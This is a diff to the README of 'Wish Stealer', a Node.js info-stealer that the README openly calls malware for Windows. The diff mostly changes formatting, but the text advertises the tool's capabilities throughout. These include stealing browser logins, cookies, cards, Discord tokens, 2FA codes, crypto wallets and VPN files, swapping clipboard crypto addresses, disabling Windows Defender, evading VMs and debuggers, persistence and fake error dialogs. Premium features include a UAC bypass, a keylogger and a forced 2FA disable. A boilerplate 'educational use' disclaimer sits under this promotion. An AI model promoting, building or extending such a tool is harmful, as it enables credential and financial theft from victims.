@@ -1,7 +1,7 @@
-[shield-github-issues]: https://img.shields.io/github/issues/k4itrun/wish?style=for-the-badge&color=ffffff
-[shield-github-license]: https://img.shields.io/github/license/k4itrun/wish?style=for-the-badge&color=ffffff
-[shield-github-stars]: https://img.shields.io/github/stars/k4itrun/wish?style=for-the-badge&color=ffffff
-[shield-github-forks]: https://img.shields.io/github/forks/k4itrun/wish?style=for-the-badge&color=ffffff
+[shield-github-issues]: https://img.shields.io/github/issues/k4itrun/wish?style=for-the-badge&color=8E54E9
+[shield-github-license]: https://img.shields.io/github/license/k4itrun/wish?style=for-the-badge&color=8E54E9
+[shield-github-stars]: https://img.shields.io/github/stars/k4itrun/wish?style=for-the-badge&color=8E54E9
+[shield-github-forks]: https://img.shields.io/github/forks/k4itrun/wish?style=for-the-badge&color=8E54E9
 
 [github-assets-img-config-link]: .github/assets/config.png
 
@@ -13,13 +13,11 @@
 [github-assets-img-sessioninstagram-link]: .github/assets/sessioninstagram.png
 [github-assets-img-sessiontiktok-link]: .github/assets/sessiontiktok.png
 [github-assets-img-games-link]: .github/assets/games.png
-[github-assets-img-steam-link]: .github/assets/steam.png
 [github-assets-img-commonfiles-link]: .github/assets/commonfiles.png
 [github-assets-img-stealcodes-link]: .github/assets/stealcodes.png
 [github-assets-img-tokens-link]: .github/assets/tokens.png
-[github-assets-img-wallets-link]: .github/assets/wallets.png
-[github-assets-img-vpns-link]: .github/assets/vpns.png
-[github-assets-img-socials-link]: .github/assets/socials.png
+[github-assets-img-wallets-extensions-link]: .github/assets/wallets-extensions.png
+[github-assets-img-vpns-socials-link]: .github/assets/vpns-socials.png
 [github-assets-img-wish-link]: .github/assets/wish.png
 [github-assets-img-files-link]: .github/assets/files.png
 
@@ -33,12 +31,12 @@
 
 <div align="center">
 
-<img src=".github/assets/avatar.png" width=100 alt="Aurita"/><br/>
-
 [![][shield-github-issues]][github-issues-link]
 [![][shield-github-license]][github-license-link]
 [![][shield-github-stars]][github-stars-link]
 [![][shield-github-forks]][github-forks-link]<br/>
+
+<img src=".github/assets/avatar.png" width=100 alt="Aurita"/><br/>
 
 # [@Wish Stealer][github-link]
 Node.js malware for Windows that steals data from Discord, browsers, and crypto wallets, affecting all users.
@@ -48,12 +46,12 @@ Node.js malware for Windows that steals data from Discord, browsers, and crypto 
 ## Table of Contents
 1. [Overview](#overview)
    - [Features](#features-50)
+   - [Premium Features](#premium-features)
 2. [Getting Started](#getting-started)
    - [Requirements](#requirements)
    - [Installation](#installation)
 3. [Usage](#usage)
 4. [Preview](#preview)
-      - [Premium Features](#premium-features)
       - [Star History](#star-history)
 5. [Uninstalling](#uninstalling)
 6. [Acknowledgments](#acknowledgments)
@@ -63,45 +61,60 @@ Node.js malware for Windows that steals data from Discord, browsers, and crypto 
 10. [Disclaimer](#disclaimer)
 
 ## Overview
-The most comprehensive open-source stealer based on Node.js available on GitHub. This Discord stealer utilizes a privilege escalation technique to gain access to all user sessions on Windows.
+The most comprehensive open-source stealer based on Node.js available on GitHub. 🚀 This Discord stealer utilizes a privilege escalation technique to gain access to all user sessions on Windows. 🔑
 
-- If you're wondering where the previous "AuraThemes" repository was, it was simply abandoned by the creation of this new one.
+- If you're wondering where the previous "AuraThemes" repository was, it was simply abandoned by the creation of this new one. 🗂️
 
 ### Features (+50)
-
 - [Development][github-link]
-   - Clean and efficient codebase.
-   - Up-to-date dependencies.
-   - Minimal reliance on external Node.js libraries.
+   - Clean and efficient codebase. ✨
+   - Up-to-date dependencies. 📅
+   - Minimal reliance on external Node.js libraries. 📦
 - [Modules][github-link]
-   - [antidebug](src/modules/antidebug/antidebug.js): Terminates debugging tools (incomplete).
-   - [antivirus](src/modules/antivirus/antivirus.js): Disables Windows Defender and blocks access to antivirus-related websites.
-   - [antivm](src/modules/antivm/antivm.js): Terminates execution if running inside a virtual machine environment.
+   - [antidebug](src/modules/antidebug/antidebug.js): Terminates debugging tools (incomplete). 🛠️
+   - [antivirus](src/modules/antivirus/antivirus.js): Disables Windows Defender and blocks access to antivirus-related websites. 🚫
+   - [antivm](src/modules/antivm/antivm.js): Terminates execution if running inside a virtual machine environment. 🖥️
    - [browsers](src/modules/browsers/browsers.js): 
-      - Captures logins, cookies, credit card details, bookmarks, autofill data, browsing history, and downloads from 37 Chromium-based browsers.
-      - Captures logins, cookies, browsing history, bookmarks, and downloads from 10 Gecko/Firefox-based browsers.
-   - [sessions](src/modules/browsers/sessions.js): Extracts active sessions from platforms like Spotify, TikTok, and Instagram.
-   - [clipper](src/modules/clipper/clipper.js): Monitors the clipboard for cryptocurrency addresses and replaces them with predefined addresses.
-   - [commonfiles](src/modules/commonfiles/commonfiles.js): Collects sensitive files from common directories on the system.
-   - [fakeerror](src/modules/fakeerror/fakeerror.js): Displays a fake error message to trick users into thinking the program has crashed.
-   - [games](src/modules/games/games.js): Extracts session data from popular game launchers such as Epic Games, Uplay, Minecraft, and Riot Games.
-   - [hideconsole](src/modules/hideconsole/hideconsole.js): Hides the console window to run the program discreetly.
-   - [injections](src/modules/injections): Injects into applications like Discord and crypto wallets to capture sensitive information.
+      - Captures logins, cookies, credit card details, bookmarks, autofill data, browsing history, and downloads from 37 Chromium-based browsers. 🔍
+      - Captures logins, cookies, browsing history, bookmarks, and downloads from 10 Gecko/Firefox-based browsers. 🦊
+   - [sessions](src/modules/browsers/sessions.js): Extracts active sessions from platforms like Spotify, TikTok, and Instagram. 📱
+   - [clipper](src/modules/clipper/clipper.js): Monitors the clipboard for crypto addresses and replaces them. 💰
+   - [commonfiles](src/modules/commonfiles/commonfiles.js): Collects sensitive files from common directories on the system. 📂
+   - [fakeerror](src/modules/fakeerror/fakeerror.js): Displays a fake error message to trick users into thinking the program has crashed. ❌
+   - [games](src/modules/games/games.js): Extracts session data from popular game launchers like Epic Games and Minecraft and More. 🎮
+   - [hideconsole](src/modules/hideconsole/hideconsole.js): Hides the console window to run the program discreetly. 👀
+   - [injections](src/modules/injections): Injects into applications like Discord and crypto wallets to capture sensitive information. 💉
       - [discord](src/modules/injections/discord/discord.js):
-         - Persistent startup injection (remains active even if the user attempts to remove it).
-         - Captures logins, registration data, and two-factor authentication requests.
-         - Intercepts email and password change requests as well as backup code requests.
-         - Blocks QR code logins and views of connected devices.
-         - Phishing mode simulates alerts to trick users into changing their email credentials.
-   - [killprocess](src/modules/killprocess/killprocess.js): Terminates processes that are listed in a predefined blacklist.
-   - [socials](src/modules/socials/socials.js): Extracts data from over 20 social media applications, stealing sensitive information from each.
-   - [startup](src/modules/startup/startup.js): Ensures the program launches automatically when the system starts.
-   - [stealcodes](src/modules/stealcodes/stealcodes.js): Captures two-factor authentication (2FA) codes from services like Discord, GitHub, Google, and more.
-   - [system](src/modules/system/system.js): Gathers detailed system information including IP address, installed antivirus software, screenshots, CPU, GPU, RAM details, location, and saved Wi-Fi networks.
-   - [tokens](src/modules/tokens/tokens.js): Extracts tokens from four Discord applications and over 30 browsers.
-   - [vpns](src/modules/vpns/vpns.js): Retrieves sensitive files from over 20 VPN applications installed on the system.
-   - [wallets](src/modules/wallets/wallets.js): Extracts data from more than 30 browser-based cryptocurrency wallets, as well as crucial information from locally installed wallets.
+         - Persistent startup injection (remains active even if the user attempts to remove it). 🔄
+         - Captures logins, registration data, and two-factor authentication requests. 📧
+         - Intercepts email and password change requests as well as backup code requests. 🔑
+         - Blocks QR code logins and views of connected devices. 🚫
+         - Phishing mode simulates alerts to trick users into changing their email credentials. 🎣
+   - [killprocess](src/modules/killprocess/killprocess.js): Terminates processes that are listed in a predefined blacklist. 🚷
+   - [socials](src/modules/socials/socials.js): Extracts data from over 20 social media applications, stealing sensitive information from each. 📸
+   - [startup](src/modules/startup/startup.js): Ensures the program launches automatically when the system starts. ⚙️
+   - [stealcodes](src/modules/stealcodes/stealcodes.js): Captures (2FA) codes from services like Discord, GitHub, Google, and more. 🔒
+   - [system](src/modules/system/system.js): Gathers detailed system information including IP address, installed antivirus software, screenshots, CPU, GPU, RAM details, location, and saved Wi-Fi networks. 📊
+   - [tokens](src/modules/tokens/tokens.js): Extracts tokens from four Discord applications and over 30 browsers. 🗝️
+   - [vpns](src/modules/vpns/vpns.js): Retrieves sensitive files from over 20 VPN applications installed on the system. 🔐
+   - [wallets](src/modules/wallets/wallets.js): Extracts data from more than 30 browser-based cryptocurrency wallets, as well as crucial information from locally installed wallets. 💼
 
+### Premium Features
+- Marked features: Premium  
+   - [ ] **Upload files**: Upload files seamlessly. 📤  
+   - [ ] **Update/Reinstall Bypass**: Bypass update and reinstallation processes. 🔄  
+   - [ ] **File/Session Theft**: Steal files and active sessions. 📂  
+   - [ ] **Clipper Wallets**: Monitor and replace cryptocurrency wallet addresses. 💰  
+   - [ ] **Launcher Stealer**: Extract data from game launchers. 🎮  
+   - [ ] **VPN and Messenger Stealers**: Capture sensitive data from VPNs and messaging apps. 🌐  
+   - [x] **Extension Injection**: Inject malicious extensions into browsers. 💉  
+   - [x] **UAC Bypass**: Bypass User Account Control prompts. 🚫  
+   - [x] **Wallet Injection**: Inject data into cryptocurrency wallets. 💳  
+   - [x] **Email Injection**: Intercept and modify email communications. 📧  
+   - [x] **Keylogger Integration**: Record keystrokes for sensitive information. ⌨️  
+   - [x] **Discord Injection (Force 2FA Disabled)**: Inject into Discord to disable two-factor authentication. 🔒  
+   - [x] **Builder, Discord Bot, and API**: Create bots and APIs for Discord functionalities. 🤖
+   
 ## Getting Started
 
 ### Requirements
@@ -145,38 +158,34 @@ npm run start or node index
 
 ## Preview
 ![][github-assets-img-system1-link]
-![][github-assets-img-system2-link]
-![][github-assets-img-browsers-link]
-![][github-assets-img-keywords-link]
-![][github-assets-img-sessionspotify-link]
-![][github-assets-img-sessioninstagram-link]
-![][github-assets-img-sessiontiktok-link]
-![][github-assets-img-steam-link]
-![][github-assets-img-commonfiles-link]
-![][github-assets-img-stealcodes-link]
-![][github-assets-img-tokens-link]
-![][github-assets-img-games-link]
-![][github-assets-img-wallets-link]
-![][github-assets-img-vpns-link]
-![][github-assets-img-socials-link]
-![][github-assets-img-wish-link]
-![][github-assets-img-files-link]
 
-### Premium Features
-- Marked features: Premium  
-   - [ ] Upload files
-   - [ ] Update/Reinstall Bypass
-   - [ ] File/session theft
-   - [ ] Clipper Wallets
-   - [ ] Launcher Stealer
-   - [ ] VPN and Messenger Stealers
-   - [x] Extension Injection
-   - [x] UAC Bypass
-   - [x] Wallet Injection
-   - [x] Email Injection
-   - [x] Keylogger Integration
-   - [x] Discord Injection (Force 2FA disabled)
-   - [x] Builder, Discord Bot and API
+![][github-assets-img-system2-link]
+
+![][github-assets-img-browsers-link]
+
+![][github-assets-img-keywords-link]
+
+![][github-assets-img-sessionspotify-link]
+
+![][github-assets-img-sessioninstagram-link]
+
+![][github-assets-img-sessiontiktok-link]
+
+![][github-assets-img-commonfiles-link]
+
+![][github-assets-img-stealcodes-link]
+
+![][github-assets-img-tokens-link]
+
+![][github-assets-img-wallets-extensions-link]
+
+![][github-assets-img-vpns-socials-link]
+
+![][github-assets-img-games-link]
+
+![][github-assets-img-wish-link]
+
+![][github-assets-img-files-link]
 
 ### Star History
 <a href="https://star-history.com/#k4itrun/wish&Timeline">
@@ -218,14 +227,14 @@ For inquiries, reach out at [contact@w1sh.xyz](mailto:contact@w1sh.xyz) or join 
 This software is licensed under the [MIT License](LICENSE).
 
 ## Disclaimer
-### Essential Advisory: This tool is for educational use only.
-This tool is intended for educational purposes only. Misuse will not be supported, and by using it, you agree to these terms.
+### Important Notice: Educational Use Only.
+This tool is designed solely for educational purposes. Any misuse of this tool is strictly prohibited. By using this tool, you acknowledge and accept these terms.
 
 ### User Accountability:
-By using this tool, you accept full responsibility for your actions. Misuse of this software is prohibited, and the creator disclaims any liability. Ensure your usage complies with all relevant laws.
+By utilizing this tool, you take full responsibility for your actions. The creator disclaims any liability for misuse. It is your responsibility to ensure that your use of this software complies with all applicable laws and regulations.
 
 ### No Assistance:
-The creator will not provide support or address misuse. Inquiries related to harmful use will be ignored.
+The creator will not provide assistance or support for any misuse of this tool. Any inquiries related to harmful or illegal activities will be ignored.
 
 ### Terms Acceptance:
-By using this tool, you agree to this disclaimer. If you do not agree, refrain from using the software.
+By using this tool, you agree to abide by this disclaimer. If you do not agree with these terms, please do not use the software.
